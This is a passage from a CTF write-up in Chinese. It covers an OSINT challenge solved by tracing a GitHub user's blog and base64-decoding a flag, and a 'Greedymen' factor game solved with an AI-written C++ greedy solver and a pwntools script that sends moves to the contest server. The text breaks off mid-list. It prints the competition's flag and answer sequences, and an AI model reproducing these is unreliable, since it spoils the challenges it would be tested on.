<p><img src="/images/QQ_1743832317067-1744626745339-74.png" loading="lazy"></p>
<p><img src="/images/1743832324744-64f7289f-3287-4b94-996f-1b63731e7717-1744626745335-1.png" loading="lazy"></p>
<p>github可以搜到dragonkeep</p>
<p>通过访问他的.github.io会重定位到</p>
<p><img src="/images/QQ_1743832409731-1744626745339-76.png" loading="lazy"></p>
<p>找到第一篇文章。</p>
<p><img src="/images/QQ_1743832453654-1744626745339-75.png" loading="lazy"></p>
<p>f12找到flag进行base64解密。</p>
<p><img src="/images/QQ_1743832482740-1744626745339-77.png" loading="lazy">flag{1t_I3_t3E_s@Me_ChAl1eNge_aT_a1L_P1e@se_fOrg1ve_Me}</p>
<h3 id="Greedymen"><a href="#Greedymen" class="headerlink" title="Greedymen"></a>Greedymen</h3><p>将题目和思路发给claude写出计算优解代码</p>
<p>思路：先拿最大质数；从其他质数相关的大合数开始取；给对面拿最少分数前提取剩下的数字</p>
<p>算法代码：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;set></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;map></span></span>

<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">getFactors</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> factors<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">%</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
            factors<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> factors<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">bool</span> <span class="token function">isPrime</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">*</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">%</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">struct</span> <span class="token class-name">Evaluation</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> immediateGain<span class="token punctuation">;</span>
    <span class="token keyword">int</span> futureImpact<span class="token punctuation">;</span>
    <span class="token keyword">int</span> numFactors<span class="token punctuation">;</span>

    <span class="token keyword">bool</span> <span class="token keyword">operator</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token keyword">const</span> Evaluation <span class="token operator">&amp;</span>other<span class="token punctuation">)</span> <span class="token keyword">const</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>immediateGain <span class="token operator">!=</span> other<span class="token punctuation">.</span>immediateGain<span class="token punctuation">)</span>
            <span class="token keyword">return</span> immediateGain <span class="token operator">&lt;</span> other<span class="token punctuation">.</span>immediateGain<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>futureImpact <span class="token operator">!=</span> other<span class="token punctuation">.</span>futureImpact<span class="token punctuation">)</span>
            <span class="token keyword">return</span> futureImpact <span class="token operator">&lt;</span> other<span class="token punctuation">.</span>futureImpact<span class="token punctuation">;</span>
        <span class="token keyword">return</span> numFactors <span class="token operator">></span> other<span class="token punctuation">.</span>numFactors<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token keyword">int</span> NEG_INF <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1000000000</span><span class="token punctuation">;</span> <span class="token comment">// 使用整数常量</span>

Evaluation <span class="token function">evaluateChoice</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">const</span> set<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">&amp;</span>usedNumbers<span class="token punctuation">,</span> <span class="token keyword">int</span> maxNum<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> factors <span class="token operator">=</span> <span class="token function">getFactors</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> opponentGain <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    set<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> newUsed <span class="token operator">=</span> usedNumbers<span class="token punctuation">;</span>
    newUsed<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> factor <span class="token operator">:</span> factors<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>factor <span class="token operator">!=</span> num <span class="token operator">&amp;&amp;</span> usedNumbers<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>factor<span class="token punctuation">)</span> <span class="token operator">==</span> usedNumbers<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            opponentGain <span class="token operator">+=</span> factor<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">int</span> futureOptions <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> maxNum<span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>newUsed<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> newUsed<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> iFactors <span class="token operator">=</span> <span class="token function">getFactors</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">bool</span> hasUnusedFactor <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> f <span class="token operator">:</span> iFactors<span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>f <span class="token operator">!=</span> i <span class="token operator">&amp;&amp;</span> newUsed<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token operator">==</span> newUsed<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">&#123;</span>
                    hasUnusedFactor <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>hasUnusedFactor<span class="token punctuation">)</span>
                futureOptions<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>num <span class="token operator">-</span> opponentGain<span class="token punctuation">,</span> futureOptions<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>factors<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">solveLevel</span><span class="token punctuation">(</span><span class="token keyword">int</span> maxNum<span class="token punctuation">,</span> <span class="token keyword">int</span> moves<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    set<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> used<span class="token punctuation">;</span>
    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> choices<span class="token punctuation">;</span>
    <span class="token keyword">int</span> myScore <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> opponentScore <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    map<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> factorMap<span class="token punctuation">;</span>

    <span class="token comment">// 预计算所有数的因数</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> maxNum<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        factorMap<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getFactors</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span>moves <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span> bestNum <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        Evaluation bestEval <span class="token operator">=</span> <span class="token punctuation">&#123;</span>NEG_INF<span class="token punctuation">,</span> NEG_INF<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token comment">// 使用整数常量</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> maxNum<span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>used<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">!=</span> used<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span><span class="token punctuation">;</span>

            <span class="token keyword">bool</span> hasUnusedFactor <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> factor <span class="token operator">:</span> factorMap<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>factor <span class="token operator">!=</span> i <span class="token operator">&amp;&amp;</span> used<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>factor<span class="token punctuation">)</span> <span class="token operator">==</span> used<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">&#123;</span>
                    hasUnusedFactor <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>hasUnusedFactor<span class="token punctuation">)</span>
                <span class="token keyword">continue</span><span class="token punctuation">;</span>

            Evaluation eval <span class="token operator">=</span> <span class="token function">evaluateChoice</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> used<span class="token punctuation">,</span> maxNum<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>bestEval <span class="token operator">&lt;</span> eval<span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
                bestEval <span class="token operator">=</span> eval<span class="token punctuation">;</span>
                bestNum <span class="token operator">=</span> i<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>bestNum <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>

        choices<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>bestNum<span class="token punctuation">)</span><span class="token punctuation">;</span>
        myScore <span class="token operator">+=</span> bestNum<span class="token punctuation">;</span>
        used<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>bestNum<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> factor <span class="token operator">:</span> factorMap<span class="token punctuation">[</span>bestNum<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>factor <span class="token operator">!=</span> bestNum <span class="token operator">&amp;&amp;</span> used<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>factor<span class="token punctuation">)</span> <span class="token operator">==</span> used<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
                opponentScore <span class="token operator">+=</span> factor<span class="token punctuation">;</span>
                used<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>factor<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>

        moves<span class="token operator">--</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 计算剩余数字</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> maxNum<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>used<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> used<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            opponentScore <span class="token operator">+=</span> i<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Level "</span> <span class="token operator">&lt;&lt;</span> maxNum <span class="token operator">&lt;&lt;</span> <span class="token string">" ("</span> <span class="token operator">&lt;&lt;</span> moves <span class="token operator">&lt;&lt;</span> <span class="token string">" moves):\n"</span><span class="token punctuation">;</span>
    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"choices = ["</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>size_t i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> choices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        cout <span class="token operator">&lt;&lt;</span> choices<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> choices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
            cout <span class="token operator">&lt;&lt;</span> <span class="token string">", "</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"]\n"</span><span class="token punctuation">;</span>

    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"My Score: "</span> <span class="token operator">&lt;&lt;</span> myScore <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>
    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Opponent Score: "</span> <span class="token operator">&lt;&lt;</span> opponentScore <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>
    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Score Difference: "</span> <span class="token operator">&lt;&lt;</span> myScore <span class="token operator">-</span> opponentScore <span class="token operator">&lt;&lt;</span> <span class="token string">"\n\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">solveLevel</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Level 1</span>
    <span class="token function">solveLevel</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Level 2</span>
    <span class="token function">solveLevel</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Level 3</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>输出：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp">Level <span class="token number">50</span> <span class="token punctuation">(</span><span class="token number">0</span> moves<span class="token punctuation">)</span><span class="token operator">:</span>
choices <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">]</span>
My Score<span class="token operator">:</span> <span class="token number">718</span>
Opponent Score<span class="token operator">:</span> <span class="token number">557</span>
Score Difference<span class="token operator">:</span> <span class="token number">161</span>

Level <span class="token number">100</span> <span class="token punctuation">(</span><span class="token number">0</span> moves<span class="token punctuation">)</span><span class="token operator">:</span>
choices <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">]</span>
My Score<span class="token operator">:</span> <span class="token number">2856</span>
Opponent Score<span class="token operator">:</span> <span class="token number">2194</span>
Score Difference<span class="token operator">:</span> <span class="token number">662</span>

Level <span class="token number">200</span> <span class="token punctuation">(</span><span class="token number">0</span> moves<span class="token punctuation">)</span><span class="token operator">:</span>
choices <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">199</span><span class="token punctuation">,</span> <span class="token number">187</span><span class="token punctuation">,</span> <span class="token number">169</span><span class="token punctuation">,</span> <span class="token number">185</span><span class="token punctuation">,</span> <span class="token number">161</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">183</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">177</span><span class="token punctuation">,</span> <span class="token number">145</span><span class="token punctuation">,</span> <span class="token number">175</span><span class="token punctuation">,</span> <span class="token number">133</span><span class="token punctuation">,</span> <span class="token number">159</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">153</span><span class="token punctuation">,</span> <span class="token number">194</span><span class="token punctuation">,</span> <span class="token number">141</span><span class="token punctuation">,</span> <span class="token number">188</span><span class="token punctuation">,</span> <span class="token number">178</span><span class="token punctuation">,</span> <span class="token number">129</span><span class="token punctuation">,</span> <span class="token number">172</span><span class="token punctuation">,</span> <span class="token number">166</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">164</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">195</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">189</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">196</span><span class="token punctuation">,</span> <span class="token number">182</span><span class="token punctuation">,</span> <span class="token number">165</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">154</span><span class="token punctuation">,</span> <span class="token number">148</span><span class="token punctuation">,</span> <span class="token number">146</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">156</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">142</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> <span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">186</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">174</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">168</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">162</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">138</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">132</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">]</span>
My Score<span class="token operator">:</span> <span class="token number">11094</span>
Opponent Score<span class="token operator">:</span> <span class="token number">9006</span>
Score Difference<span class="token operator">:</span> <span class="token number">2088</span></code></pre>

<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>


context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"47.94.204.178"</span><span class="token punctuation">,</span><span class="token number">26629</span> <span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'3.Quit\n'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span>

<span class="token comment"># 这边打的时候Level1使用的是之前手动取的值</span>
nums<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
